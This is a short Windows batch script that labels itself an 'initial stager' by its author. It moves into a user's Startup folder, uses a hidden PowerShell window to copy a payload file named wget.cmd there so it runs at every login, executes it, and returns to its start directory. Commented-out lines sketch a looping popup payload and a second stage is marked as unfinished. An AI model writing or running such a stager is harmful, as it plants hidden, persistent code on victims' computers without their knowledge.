@echo off 
@REM initial stager created by : m98

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:\Users\arash\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

@REM move into startup directory
cd /d "%STARTUP%"

@REM todo: build out stage two
@REM write payload to startup

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri D:\py\tar\wget.cmd -OutFile wget.cmd"

@REM run payload
powershell ./wget.cmd

@REM cd back into initial location
cd /d "%INITIALPATH%"


@REM del initial.cmd
@REM (
@REM echo @echo off
@REM echo : loop
@REM echo start /min cmd /c "popup.vbs"
@REM echo goto loop
@REM ) > payload.cmd


